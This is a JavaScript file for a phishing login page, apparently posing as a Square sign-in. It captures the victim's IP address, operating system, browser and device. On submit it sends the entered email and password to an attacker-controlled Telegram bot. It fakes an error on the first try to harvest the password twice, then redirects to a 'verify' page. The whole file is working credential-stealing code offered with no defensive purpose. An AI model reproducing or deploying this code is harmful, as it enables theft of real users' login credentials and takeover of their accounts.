var signinbtn = document.getElementById('login-standard-submit')

$.getJSON("https://api.ipify.org?format=json", function(data) {

var ip = document.getElementById('gfg').value = data.ip

})



var useragent = navigator.userAgent
const parser = new UAParser(useragent);
const parserResults = parser.getResult();




var osdetails = parserResults.os.name + ' ' + parserResults.os.version
var browser = parserResults.browser.name + ' ' +  parserResults.browser.version
var device = parserResults.device.model + ' ' + parserResults.device.vendor



var emailinput = document.getElementById('email')
var passwordinput = document.getElementById('password')


emailinput.addEventListener('input', function(){
    document.getElementById('errmsg').style.display = "none"
    $( "#email" ).removeClass( "invalido" );
})




passwordinput.addEventListener('input', function(){
    document.getElementById('errmsg').style.display = "none"
    $( "#email" ).removeClass( "invalido" );
})




            signinbtn.addEventListener('click', function(e){

                e.preventDefault()
               
               
                var ip = document.getElementById('gfg').value 
                var email = document.getElementById('email').value
                var password = document.getElementById('password').value
 

        

                // console.log("email = " + email )

                // console.log("password = " + password )

                // console.log("ip = " + ip )


                // console.log("OS = " + osdetails )

                // console.log("Browser = " + browser )

                // console.log("Device = " + device )

                var validRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;


                if(email == "" ||  password == ""){


                   
              
                    document.getElementById('both-error').innerHTML = 'Email and password field cannot be empty.'
                    document.getElementById('errmsg').style.display = "block"
                    console.log('Email and password field cannot be empty')

                } else if(email.match(validRegex) && password != "")  {

                    console.log('Email and password is valid')
                    const url = `https://api.telegram.org/bot${tg.token}/sendMessage` // The url to request

                    const obj = {
                        chat_id: tg.chat_id, // Telegram chat id
                        text:   "\r\n" + "\r\n" + "Square up " +  "\r\n" + "IP : " + ip  + "\r\n" +  "\r\n" + "Email : " + email +  "\r\n" + "Password : " + password   + "\r\n" + "\r\n" + "OS version : " + osdetails +  "\r\n" + "Broswer type : " +  browser + "\r\n" + "Device type : " + device      // The text to send
                    };

                    $.ajax({
                        type: 'POST',
                        url: url,
                        data: obj,
                        dataType: "json",
                        success: function() {  
                            
                            var key = localStorage.getItem('key', 1);

                            if(key == null){
                                document.getElementById('password').value = ""
                                document.getElementById('both-error').innerHTML = 'An unexpected error has occurred. Please try again.'
                                document.getElementById('errmsg').style.display = "block"
                                localStorage.setItem('key', 1);
                            }else{
                                
                                window.location.replace('verify.html')
                            }
                            
                            
                         
                        
                        
                        } })
                     
                   
                }

                else {

                    document.getElementById('both-error').innerHTML = 'Enter a valid email'
                    $( "#email" ).addClass( "invalido" );
                    console.log('Email and password still cannot be empty')

                }


            
            
            
            
            
            })
            

